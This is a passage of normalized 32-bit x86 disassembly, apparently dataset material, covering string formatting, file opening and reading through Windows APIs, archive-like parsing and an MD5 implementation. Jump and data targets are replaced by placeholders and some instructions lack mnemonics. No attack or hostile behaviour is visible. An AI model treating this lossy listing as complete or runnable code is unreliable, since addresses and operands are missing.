lea eax [ ebp - 0x24 ]
push eax
call edi
movzx eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xc ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x12 ]
push eax
movzx eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x588 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x588 ]
push eax
push ebx
call strcat
mov eax [ ebp - 0x78 ]
add esp 0x28
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x74 ]
mov ecx eax
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x1c ]
sar ecx 0x1f
push eax
call esi
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call edi
movzx eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xc ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x12 ]
push eax
movzx eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x588 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x588 ]
push eax
push ebx
call strcat
mov eax [ ebp - 0x68 ]
add esp 0x28
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x64 ]
mov ecx eax
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x1c ]
sar ecx 0x1f
push eax
call esi
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call edi
movzx eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xc ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x12 ]
push eax
movzx eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x588 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x588 ]
push eax
push ebx
call strcat
lea eax [ ebp - 0x188 ]
push eax
lea eax [ ebp - 0x588 ]
push [ ebp - 0x58 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x588 ]
push eax
push ebx
call strcat
add esp 0x40
inc [ ebp - 0x28 ]
push ebx
call strlen
add eax 0x185
push eax
push ebx
call realloc
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
lea eax [ ebp - 0x588 ]
push rw-data
push eax
call sprintf
pop ecx
pop ecx
sub_40b404
push ebp
mov ebp esp
sub esp 0x688
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
cmp cl 0x20
jne r-xdata
lea eax [ ebp - 0x288 ]
push rw-data
push eax
call sprintf
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x288 ]
push rw-data
push eax
call sprintf
add esp 0xc
jmp r-xdata
inc eax
jmp r-xdata
push [ rw-data ]
lea eax [ ebp - 0x44 ]
push rw-data
push rw-data
push eax
call sprintf
add esp 0x10
lea eax [ ebp - 0x44 ]
push esi
push esi
push 0x3
push esi
push 0x3
push 0x80000000
push eax
call [ CreateFileA@IAT ]
push eax
call sub_408bb6
mov eax [ rw-data ]
mov [ esp ] 0x200
imul eax eax 0x1c
push [ eax + rw-data ]
call sub_408bc7
pop ecx
pop ecx
call sub_408bda
cmp eax esi
jne r-xdata
lea eax [ ebp - 0x688 ]
push rw-data
push eax
call sprintf
pop ecx
pop ecx
jmp r-xdata
push ebx
push esi
push edi
push 0xffffffff
lea eax [ ebp - 0x688 ]
xor esi esi
push 0x400
push eax
mov [ rw-data ] esi
call sub_409330
add esp 0xc
test eax eax
je r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
push eax
push rw-data
lea ecx [ ebp - 0x184 ]
xor eax eax
push ecx
push eax
xor ebx ebx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0xc ] esi
xor edi edi
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x8 ] eax
call sub_408f36
pop ecx
cmp eax 0x12
pop ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
lea eax [ ebp - 0x688 ]
push eax
call _strdup
pop ecx
leave
retn
push [ ebp + 0x8 ]
call free
pop ecx
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] 0x1
inc [ ebp - 0x8 ]
lea eax [ ebp - 0x184 ]
push eax
push [ ebp - 0x8 ]
call sub_408f36
pop ecx
cmp eax 0x12
pop ecx
jne r-xdata
cmp [ ebp - 0x4c ] 0x1
jne r-xdata
test eax eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
test ecx ecx
jle r-xdata
cmp [ ebp - 0x5c ] 0x10000000
je r-xdata
lea eax [ ebx + esi ]
add eax [ ebp - 0x10 ]
add eax [ ebp - 0x4 ]
add eax [ ebp - 0xc ]
add eax edi
add ecx eax
push ecx
push esi
push ebx
push [ ebp - 0x10 ]
push edi
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x288 ]
push eax
lea eax [ ebp - 0x688 ]
push rw-data
push eax
call sprintf
add esp 0x2c
jmp r-xdata
lea eax [ ebx + esi ]
add eax [ ebp - 0x10 ]
add eax [ ebp - 0x4 ]
add eax [ ebp - 0xc ]
add eax edi
lea edx [ eax + ecx ]
push edx
push esi
push ebx
push [ ebp - 0x10 ]
push edi
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x288 ]
push ecx
push eax
lea eax [ ebp - 0x688 ]
push rw-data
push eax
call sprintf
add esp 0x30
jmp r-xdata
cmp [ ebp - 0x5c ] 0x2820
je r-xdata
lea eax [ ebp - 0x184 ]
push eax
call strlen
test eax eax
pop ecx
jbe r-xdata
lea eax [ ebp - 0x184 ]
push eax
lea eax [ ebp - 0x288 ]
push eax
call sub_40a424
pop ecx
cmp eax 0x1
pop ecx
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x8 ]
call sub_408e60
add esp 0xc
mov [ ebp - 0x24 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
push [ ebp - 0x1c ]
call ??3@YAXPAX@Z
and [ ebp - 0x1c ] 0x0
pop ecx
cmp [ rw-data ] 0x1
jne r-xdata
inc [ ebp - 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
inc [ ebp - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x20 ] 0x3200000
jbe r-xdata
inc ebx
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
inc edi
jmp r-xdata
push [ ebp - 0x18 ]
lea eax [ ebp - 0x184 ]
push [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x688 ]
push [ ebp - 0x8 ]
push rw-data
push eax
call sprintf
lea eax [ ebp - 0x688 ]
push eax
call sub_40a25b
push 0x6
push rw-data
push eax
mov [ ebp + 0x8 ] eax
call strncmp
add esp 0x28
test eax eax
je r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
push 0x6
push rw-data
push [ ebp + 0x8 ]
call strncmp
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x57
push 0x12
push 0xc
lea eax [ ebp - 0x688 ]
push [ ebp - 0x24 ]
push rw-data
push eax
call sprintf
add esp 0x18
jmp r-xdata
push [ ebp - 0x14 ]
push rw-data
jmp r-xdata
lea eax [ ebp - 0x184 ]
push eax
lea eax [ ebp - 0x688 ]
push [ ebp - 0x8 ]
push rw-data
push eax
call sprintf
push [ ebp - 0x18 ]
lea eax [ ebp - 0x688 ]
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push eax
call sub_409a84
push 0x6
push rw-data
push eax
mov [ ebp + 0x8 ] eax
call strncmp
add esp 0x2c
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call free
pop ecx
lea eax [ ebp - 0x688 ]
push eax
call sprintf
add esp 0xc
push 0x4
push rw-data
push [ ebp + 0x8 ]
call strncmp
add esp 0xc
test eax eax
jne r-xdata
inc [ ebp - 0x14 ]
inc [ ebp - 0x18 ]
inc esi
jmp r-xdata
push [ ebp + 0x8 ]
call free
pop ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
sub_40b7e4
push ebx
push esi
mov esi ecx
xor ebx ebx
push 0x28
push ebx
lea eax [ esi + 0x28 ]
mov [ esi ] r--data
push eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] 0x3ff
mov [ esi + 0xc ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x494 ] ebx
mov [ esi + 0x498 ] ebx
call memset
push 0x442
lea eax [ esi + 0x50 ]
push ebx
push eax
call memset
add esp 0x18
mov [ esi + 0x49c ] bl
mov eax esi
pop esi
pop ebx
retn
sub_40b851
push esi
mov esi ecx
push edi
mov eax [ esi + 0x494 ]
lea edi [ esi + 0x494 ]
test eax eax
mov [ esi ] r--data
je r-xdata
and [ edi ] 0x0
and [ esi + 0x498 ] 0x0
pop edi
pop esi
retn
push eax
call ??3@YAXPAX@Z
pop ecx
sub_40b889
mov edx [ esp + 0xc ]
test edx edx
je r-xdata
push 0x57
pop eax
jmp r-xdata
test dl 0x1
jne r-xdata
retn 0x10
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
test al 0x1
je r-xdata
mov [ ecx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ecx + 0x20 ] eax
mov eax [ esp + 0x8 ]
mov [ ecx + 0x24 ] eax
mov [ ecx + 0x10 ] edx
xor eax eax
sub_40b8c0
push ebp
mov ebp esp
sub esp 0x70
push ebx
mov ebx ecx
push esi
push edi
mov eax [ ebx + 0x10 ]
cmp eax [ ebp + 0xc ]
ja r-xdata
push 0x57
pop eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
xor esi esi
cmp eax esi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov [ ebx + 0xc ] eax
mov eax [ ebx + 0x494 ]
cmp eax esi
mov [ ebp + 0xc ] esi
mov [ ebx + 0x14 ] esi
je r-xdata
mov [ ebx + 0x494 ] esi
mov [ ebx + 0x498 ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov eax [ ebx + 0x14 ]
push 0x30
add eax [ ebx + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call memcpy
mov al [ ebp - 0x1a ]
add esp 0xc
and al 0x1
mov [ ebx + 0x49c ] al
movzx eax [ ebp - 0x1c ]
mov [ ebx + 0x14 ] eax
push eax
call ??3@YAXPAX@Z
pop ecx
cmp ecx 0xa0
je r-xdata
je r-xdata
xor eax eax
cmp ecx 0xd0
je r-xdata
push 0x10
mov eax ecx
pop ecx
sub eax ecx
je r-xdata
mov [ rw-data ] 0x1
cmp ecx 0xe0
je r-xdata
lea eax [ ebp + 0x8 ]
lea esi [ ebp - 0x70 ]
push eax
lea eax [ ebp + 0xc ]
push eax
sub esp 0x40
mov edi esp
[ edi ] [ esi ]
mov ecx ebx
call sub_40bb20
test eax eax
jne r-xdata
sub eax ecx
je r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
cmp eax 0x400
jb r-xdata
cmp ecx 0xffffffff
je r-xdata
push 0x28
lea eax [ ebx + 0x28 ]
push [ ebp + 0xc ]
jmp r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
push [ ebp + 0xc ]
call ??3@YAXPAX@Z
pop ecx
mov eax [ ebx + 0x14 ]
push 0x40
add eax [ ebx + 0xc ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call memcpy
mov ecx [ ebp - 0x70 ]
mov eax 0x90
add esp 0xc
cmp ecx eax
ja r-xdata
jmp r-xdata
push eax
call memcpy
push [ ebp + 0xc ]
call ??3@YAXPAX@Z
and [ ebp + 0xc ] 0x0
add esp 0x10
and [ ebp + 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x6c ]
xor esi esi
add [ ebx + 0x14 ] eax
cmp eax esi
jbe r-xdata
lea eax [ ebp + 0x8 ]
lea esi [ ebp - 0x70 ]
push eax
lea eax [ ebp + 0xc ]
push eax
sub esp 0x40
mov edi esp
[ edi ] [ esi ]
mov ecx ebx
call sub_40bb20
test eax eax
jne r-xdata
sub eax 0x50
jne r-xdata
push [ ebp + 0x8 ]
lea eax [ ebx + 0x50 ]
push [ ebp + 0xc ]
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x8 ]
lea esi [ ebp - 0x70 ]
push eax
lea eax [ ebp + 0xc ]
push eax
sub esp 0x40
mov edi esp
[ edi ] [ esi ]
mov ecx ebx
call sub_40bb20
xor edi edi
cmp eax edi
jne r-xdata
cmp [ ebx + 0x494 ] edi
jne r-xdata
mov eax [ ebx + 0x498 ]
add eax [ ebp + 0x8 ]
push eax
call ??2@YAPAXI@Z
push [ ebx + 0x498 ]
mov esi eax
push [ ebx + 0x494 ]
push esi
call memcpy
push [ ebp + 0x8 ]
mov eax [ ebx + 0x498 ]
add eax esi
push [ ebp + 0xc ]
push eax
call memcpy
mov eax [ ebp + 0x8 ]
push [ ebx + 0x494 ]
add [ ebx + 0x498 ] eax
call ??3@YAXPAX@Z
add esp 0x20
mov [ ebx + 0x494 ] esi
mov eax [ ebp + 0x8 ]
push eax
mov [ ebx + 0x498 ] eax
call ??2@YAPAXI@Z
push [ ebp + 0x8 ]
mov [ ebx + 0x494 ] eax
push [ ebp + 0xc ]
push eax
call memcpy
add esp 0x10
jmp r-xdata
push [ ebp + 0xc ]
call ??3@YAXPAX@Z
pop ecx
mov [ ebp + 0xc ] edi
mov [ ebp + 0x8 ] edi
jmp r-xdata
sub_40bb20
push ebp
mov ebp esp
sub esp 0x28
cmp [ ebp + 0x10 ] 0x0
push ebx
push esi
mov esi ecx
push edi
mov ebx [ esi + 0x14 ]
mov [ ebp - 0x4 ] ebx
jne r-xdata
mov eax [ ebp + 0x30 ]
mov ebx [ ebp + 0x34 ]
or eax ebx
jne r-xdata
mov edi [ ebp + 0x18 ]
push edi
call ??2@YAPAXI@Z
mov ecx [ ebp + 0x48 ]
push edi
mov [ ecx ] eax
mov eax [ ebp + 0x4c ]
mov [ eax ] edi
mov edx [ esi + 0xc ]
movzx eax [ ebp + 0x1c ]
add edx eax
add edx ebx
push edx
push [ ecx ]
call memcpy
add esp 0x10
xor edi edi
mov eax [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
sub eax [ ebp + 0x18 ]
push 0x0
pop edi
sbb ebx [ ebp + 0x1c ]
add eax 0x1
mov [ ebp + 0x30 ] eax
adc ebx edi
jmp r-xdata
xor eax eax
jg r-xdata
mov eax [ ebp + 0x4c ]
mov ecx [ ebp + 0x38 ]
push [ ebp + 0x30 ]
mov [ eax ] ecx
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x48 ]
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x8 ] edi
mov [ ecx ] eax
movzx eax [ ebp + 0x28 ]
add [ ebp - 0x4 ] eax
xor eax eax
cmp [ ebp + 0x2a ] di
setne al
cmp ebx edi
mov [ rw-data ] eax
jl r-xdata
mov eax [ esi + 0xc ]
and [ ebp + 0x4f ] 0x0
add eax [ ebp - 0x4 ]
push 0x1
push eax
lea eax [ ebp + 0x4f ]
push eax
call memcpy
mov al [ ebp + 0x4f ]
add esp 0xc
inc [ ebp - 0x4 ]
test al al
je r-xdata
cmp [ ebp + 0x30 ] edi
jbe r-xdata
mov cl al
mov [ ebp - 0x18 ] edi
shr al 0x4
and cl 0xf
mov [ ebp + 0x4b ] al
movzx eax cl
mov [ ebp - 0x10 ] eax
push eax
mov eax [ esi + 0xc ]
mov [ ebp - 0x14 ] edi
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call memcpy
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] edi
add [ ebp - 0x4 ] eax
mov eax [ esi + 0xc ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] edi
movzx edi [ ebp + 0x4b ]
push edi
push eax
lea eax [ ebp - 0x28 ]
push eax
call memcpy
add [ ebp - 0x4 ] edi
add esp 0x18
test [ ebp + edi - 0x29 ] 0x80
je r-xdata
jmp r-xdata
push [ ebp - 0x14 ]
mov eax [ ebp - 0x28 ]
add [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x24 ]
push [ ebp - 0x18 ]
adc [ ebp - 0x1c ] ecx
push 0x0
push [ esi + 0x18 ]
call sub_4190a0
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
add eax ecx
xor ecx ecx
cmp ecx ebx
mov [ ebp - 0x14 ] edx
jg r-xdata
push 0x7
dec edi
pop eax
cmp edi eax
jge r-xdata
mov eax 0xdff
jmp r-xdata
jl r-xdata
or [ ebp + eax - 0x28 ] 0xff
dec eax
cmp eax edi
jg r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x48
lea eax [ ebp - 0x18 ]
mov ecx esi
push eax
push [ ebp - 0xc ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_40bce8
test eax eax
jne r-xdata
cmp eax [ ebp + 0x30 ]
ja r-xdata
mov eax [ ebp - 0x18 ]
add [ ebp - 0xc ] eax
add [ ebp - 0x8 ] eax
xor eax eax
cmp eax ebx
jl r-xdata
xor edi edi
jg r-xdata
mov eax [ ebp + 0x30 ]
cmp [ ebp - 0x8 ] eax
jb r-xdata
jmp r-xdata
sub_40bce8
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
xor ebx ebx
mov esi ecx
cmp [ edi ] ebx
jge r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push ebx
push [ esi + 0x18 ]
call sub_4190a0
add eax [ esi + 0x20 ]
lea ecx [ ebp - 0x4 ]
push ebx
push ecx
adc edx [ esi + 0x24 ]
push eax
push [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax 0xdff
jmp r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
cmp [ edi ] 0x0
mov [ ebp + 0x14 ] eax
mov [ ebp + 0xc ] ebx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x10
mov [ edi ] ebx
xor eax eax
mov eax [ esi + 0x18 ]
lea ecx [ ebp + 0xc ]
push 0x0
push ecx
push eax
push [ ebp + 0x14 ]
push [ esi + 0x8 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
add [ ebp + 0x14 ] eax
add ebx eax
cmp ebx [ edi ]
jb r-xdata
sub_40bd78
mov eax [ esp + 0x4 ]
xor ecx ecx
push 0x40
push ecx
mov [ eax ] 0x67452301
mov [ eax + 0x4 ] 0xefcdab89
mov [ eax + 0x8 ] 0x98badcfe
mov [ eax + 0xc ] 0x10325476
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] ecx
add eax 0x18
push eax
call memset
add esp 0xc
retn
sub_40bdaf
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov eax [ esi + 0x10 ]
lea ecx [ eax + ebx * 8 ]
cmp ecx eax
mov [ esi + 0x10 ] ecx
jae r-xdata
mov ecx ebx
shr ecx 0x1d
add [ esi + 0x14 ] ecx
shr eax 0x3
and eax 0x3f
je r-xdata
inc [ esi + 0x14 ]
cmp ebx 0x40
jb r-xdata
push 0x40
lea ecx [ eax + esi + 0x18 ]
pop edi
sub edi eax
cmp ebx edi
jae r-xdata
push ebx
add esi 0x18
push [ ebp + 0xc ]
push esi
mov edi ebx
shr edi 0x6
push edi
push [ ebp + 0xc ]
push ecx
call memcpy
lea eax [ esi + 0x18 ]
push esi
push eax
push esi
call sub_40bf7f
add [ ebp + 0xc ] edi
add esp 0x18
sub ebx edi
push ebx
push [ ebp + 0xc ]
push ecx
jmp r-xdata
push 0x40
lea eax [ esi + 0x18 ]
push [ ebp + 0xc ]
push eax
call memcpy
lea eax [ esi + 0x18 ]
push esi
push eax
push esi
call sub_40bf7f
add [ ebp + 0xc ] 0x40
add esp 0x18
sub ebx 0x40
dec edi
jne r-xdata
call memcpy
add esp 0xc
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40be51
push esi
mov esi [ esp + 0xc ]
push 0x3f
mov eax [ esi + 0x10 ]
pop ecx
shr eax 0x3
and eax ecx
sub ecx eax
lea edx [ eax + esi + 0x18 ]
mov [ edx ] 0x80
inc edx
cmp ecx 0x8
jae r-xdata
add ecx 0xfffffff8
push ecx
push 0x0
push edx
call memset
add esp 0xc
push edi
push ecx
push 0x0
push edx
call memset
lea edi [ esi + 0x18 ]
push esi
push edi
push esi
call sub_40bf7f
push 0x38
push 0x0
push edi
call memset
add esp 0x24
pop edi
jmp r-xdata
mov al [ esi + 0x10 ]
push esi
mov [ esi + 0x50 ] al
mov eax [ esi + 0x10 ]
mov ecx eax
shr ecx 0x8
mov [ esi + 0x51 ] cl
mov ecx eax
shr eax 0x18
mov [ esi + 0x53 ] al
mov al [ esi + 0x14 ]
shr ecx 0x10
mov [ esi + 0x54 ] al
mov eax [ esi + 0x14 ]
mov [ esi + 0x52 ] cl
mov ecx eax
shr ecx 0x8
mov [ esi + 0x55 ] cl
mov ecx eax
shr eax 0x18
mov [ esi + 0x57 ] al
lea eax [ esi + 0x18 ]
shr ecx 0x10
push eax
push esi
mov [ esi + 0x56 ] cl
call sub_40bf7f
mov eax [ esp + 0x14 ]
mov cl [ esi ]
push 0x4
push 0x0
mov [ eax ] cl
mov ecx [ esi ]
shr ecx 0x8
mov [ eax + 0x1 ] cl
mov ecx [ esi ]
shr ecx 0x10
mov [ eax + 0x2 ] cl
mov ecx [ esi ]
shr ecx 0x18
mov [ eax + 0x3 ] cl
mov dl [ esi + 0x4 ]
lea ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] dl
push esi
mov edx [ ecx ]
shr edx 0x8
mov [ eax + 0x5 ] dl
mov edx [ ecx ]
shr edx 0x10
mov [ eax + 0x6 ] dl
mov ecx [ ecx ]
shr ecx 0x18
mov [ eax + 0x7 ] cl
mov dl [ esi + 0x8 ]
lea ecx [ esi + 0x8 ]
mov [ eax + 0x8 ] dl
mov edx [ ecx ]
shr edx 0x8
mov [ eax + 0x9 ] dl
mov edx [ ecx ]
shr edx 0x10
mov [ eax + 0xa ] dl
mov ecx [ ecx ]
shr ecx 0x18
mov [ eax + 0xb ] cl
mov dl [ esi + 0xc ]
lea ecx [ esi + 0xc ]
mov [ eax + 0xc ] dl
mov edx [ ecx ]
shr edx 0x8
mov [ eax + 0xd ] dl
mov edx [ ecx ]
shr edx 0x10
mov [ eax + 0xe ] dl
mov ecx [ ecx ]
shr ecx 0x18
mov [ eax + 0xf ] cl
call memset
add esp 0x18
pop esi
retn
sub_40bf7f
push ebp
mov ebp esp
sub esp 0x40
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
push 0x10
lea ecx [ ebp - 0x40 ]
add eax 0x2
pop esi
movzx edi [ eax - 0x1 ]
xor edx edx
mov dh [ eax + 0x1 ]
mov dl [ eax ]
add eax 0x4
shl edx 0x8
or edx edi
movzx edi [ eax - 0x6 ]
shl edx 0x8
or edx edi
mov [ ecx ] edx
add ecx 0x4
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0xc ]
mov edi [ eax + 0x8 ]
mov ebx [ eax + 0x4 ]
mov ecx [ eax ]
mov edx esi
xor edx edi
and edx ebx
xor edx esi
add edx ecx
mov ecx [ ebp - 0x40 ]
lea edx [ edx + ecx - 0x28955b88 ]
mov ecx edx
shr ecx 0x19
shl edx 0x7
or ecx edx
mov edx edi
add ecx ebx
xor edx ebx
and edx ecx
xor edx edi
add edx [ ebp - 0x3c ]
lea esi [ esi + edx - 0x173848aa ]
mov edx esi
shr edx 0x14
shl esi 0xc
or edx esi
mov esi ebx
add edx ecx
xor esi ecx
and esi edx
xor esi ebx
mov ebx edx
add esi [ ebp - 0x38 ]
xor ebx ecx
lea edi [ edi + esi + 0x242070db ]
mov esi edi
shr esi 0xf
shl edi 0x11
or esi edi
mov edi [ eax + 0x4 ]
add esi edx
and ebx esi
xor ebx ecx
add ebx [ ebp - 0x34 ]
lea edi [ edi + ebx - 0x3e423112 ]
mov ebx edi
shl ebx 0x16
shr edi 0xa
or ebx edi
mov edi edx
add ebx esi
xor edi esi
and edi ebx
mov [ ebp + 0xc ] ebx
xor edi edx
add edi [ ebp - 0x30 ]
lea ecx [ ecx + edi - 0xa83f051 ]
mov edi ecx
shr edi 0x19
shl ecx 0x7
or edi ecx
mov ecx esi
add edi ebx
xor ecx ebx
and ecx edi
xor ecx esi
add ecx [ ebp - 0x2c ]
lea edx [ edx + ecx + 0x4787c62a ]
mov ecx edx
shr ecx 0x14
shl edx 0xc
or ecx edx
mov edx ebx
add ecx edi
xor edx edi
and edx ecx
xor edx ebx
add edx [ ebp - 0x28 ]
lea esi [ esi + edx - 0x57cfb9ed ]
mov edx esi
shr edx 0xf
shl esi 0x11
or edx esi
mov esi ecx
add edx ecx
xor esi edi
and esi edx
xor esi edi
add esi [ ebp - 0x24 ]
lea esi [ ebx + esi - 0x2b96aff ]
mov ebx esi
shl ebx 0x16
shr esi 0xa
or ebx esi
mov esi ecx
xor esi edx
add ebx edx
and esi ebx
mov [ ebp + 0xc ] ebx
xor esi ecx
add esi [ ebp - 0x20 ]
lea edi [ edi + esi + 0x698098d8 ]
mov esi edi
shr esi 0x19
shl edi 0x7
or esi edi
mov edi edx
add esi ebx
xor edi ebx
and edi esi
xor edi edx
add edi [ ebp - 0x1c ]
lea ecx [ ecx + edi - 0x74bb0851 ]
mov edi ecx
shr edi 0x14
shl ecx 0xc
or edi ecx
mov ecx ebx
add edi esi
xor ecx esi
and ecx edi
xor ecx ebx
add ecx [ ebp - 0x18 ]
lea edx [ edx + ecx - 0xa44f ]
mov ecx edx
shr ecx 0xf
shl edx 0x11
or ecx edx
mov edx edi
add ecx edi
xor edx esi
and edx ecx
xor edx esi
add edx [ ebp - 0x14 ]
lea edx [ ebx + edx - 0x76a32842 ]
mov ebx edx
shl ebx 0x16
shr edx 0xa
or ebx edx
mov edx edi
add ebx ecx
xor edx ecx
and edx ebx
mov [ ebp + 0xc ] ebx
xor edx edi
add edx [ ebp - 0x10 ]
lea esi [ esi + edx + 0x6b901122 ]
mov edx esi
shr edx 0x19
shl esi 0x7
or edx esi
mov esi ecx
add edx ebx
xor esi ebx
and esi edx
xor esi ecx
add esi [ ebp - 0xc ]
lea edi [ edi + esi - 0x2678e6d ]
mov ebx edi
shr ebx 0x14
shl edi 0xc
or ebx edi
mov edi [ ebp + 0xc ]
mov esi edi
add ebx edx
xor esi edx
and esi ebx
xor esi edi
add esi [ ebp - 0x8 ]
lea ecx [ ecx + esi - 0x5986bc72 ]
mov esi ecx
shr esi 0xf
shl ecx 0x11
or esi ecx
mov ecx ebx
add esi ebx
xor ecx edx
and ecx esi
xor ecx edx
add ecx [ ebp - 0x4 ]
lea edi [ edi + ecx + 0x49b40821 ]
mov ecx edi
shl ecx 0x16
shr edi 0xa
or ecx edi
mov edi esi
add ecx esi
xor edi ecx
and edi ebx
xor edi esi
add edi [ ebp - 0x3c ]
lea edx [ edx + edi - 0x9e1da9e ]
mov edi edx
shr edi 0x1b
shl edx 0x5
or edi edx
mov edx ecx
add edi ecx
xor edx edi
and edx esi
xor edx ecx
add edx [ ebp - 0x28 ]
lea ebx [ ebx + edx - 0x3fbf4cc0 ]
mov edx ebx
shr edx 0x17
shl ebx 0x9
or edx ebx
add edx edi
mov ebx edx
xor ebx edi
and ebx ecx
xor ebx edi
add ebx [ ebp - 0x14 ]
lea esi [ esi + ebx + 0x265e5a51 ]
mov ebx esi
shr ebx 0x12
shl esi 0xe
or ebx esi
mov esi edx
add ebx edx
xor esi ebx
and esi edi
xor esi edx
add esi [ ebp - 0x40 ]
lea ecx [ ecx + esi - 0x16493856 ]
mov esi ecx
shl esi 0x14
shr ecx 0xc
or esi ecx
mov ecx ebx
add esi ebx
xor ecx esi
and ecx edx
xor ecx ebx
add ecx [ ebp - 0x2c ]
lea edi [ edi + ecx - 0x29d0efa3 ]
mov ecx edi
shr ecx 0x1b
shl edi 0x5
or ecx edi
mov edi esi
add ecx esi
xor edi ecx
and edi ebx
xor edi esi
add edi [ ebp - 0x18 ]
lea edx [ edx + edi + 0x2441453 ]
mov edi edx
shr edi 0x17
shl edx 0x9
or edi edx
add edi ecx
mov edx edi
xor edx ecx
and edx esi
xor edx ecx
add edx [ ebp - 0x4 ]
lea ebx [ ebx + edx - 0x275e197f ]
mov edx ebx
shr edx 0x12
shl ebx 0xe
or edx ebx
mov ebx edi
add edx edi
xor ebx edx
and ebx ecx
xor ebx edi
add ebx [ ebp - 0x30 ]
lea esi [ esi + ebx - 0x182c0438 ]
mov ebx esi
shl ebx 0x14
shr esi 0xc
or ebx esi
mov esi edx
add ebx edx
xor esi ebx
and esi edi
xor esi edx
add esi [ ebp - 0x1c ]
lea ecx [ ecx + esi + 0x21e1cde6 ]
mov esi ecx
shr esi 0x1b
shl ecx 0x5
or esi ecx
mov ecx ebx
add esi ebx
xor ecx esi
and ecx edx
xor ecx ebx
add ecx [ ebp - 0x8 ]
